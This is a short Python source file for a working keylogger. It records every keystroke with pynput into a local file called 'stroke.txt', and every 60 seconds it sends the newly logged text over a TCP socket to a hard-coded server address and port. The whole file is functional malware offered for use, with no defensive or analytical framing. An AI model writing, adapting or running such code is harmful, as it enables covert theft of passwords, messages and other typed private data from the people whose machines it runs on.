import pynput.keyboard
import socket
import threading
import time
import os

# Configuration
log_file_path = "stroke.txt"
server_ip = "192.168.29.128"  # Replace with the server's IP address
server_port = 9999          # Port on which the server is listening
send_interval = 60          # Interval to send updates in seconds

# Initialize file pointer
file_pointer = 0

def log_key(key):
    global file_pointer
    # Write the key to the log file
    try:
        key_str = f'{key.char}'
    except AttributeError:
        if key == key.space:
            key_str = ' '
        elif key == key.enter:
            key_str = '\n'
        elif key == key.backspace:
            key_str = '[BACKSPACE]'
        elif key == key.tab:
            key_str = '[TAB]'
        else:
            key_str = f'[{key.name}]'

    # Write to the log file
    with open(log_file_path, 'a') as log_file:
        log_file.write(key_str)

def send_new_content():
    global file_pointer
    while True:
        time.sleep(send_interval)
        try:
            with open(log_file_path, 'r') as log_file:
                # Move file pointer to the last known position
                log_file.seek(file_pointer)
                new_content = log_file.read()
                
                # Update file pointer
                file_pointer = log_file.tell()
                
                # Send new content to the server
                if new_content:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.connect((server_ip, server_port))
                        s.sendall(new_content.encode('utf-8'))
                    print("Sent new content to server.")
        except Exception as e:
            print(f"Error sending log file: {e}")

def start_keylogger():
    # Start capturing keystrokes
    with pynput.keyboard.Listener(on_press=log_key) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger is running...")
    
    # Start the keylogger in a separate thread
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    # Start the periodic content sender
    send_new_content()

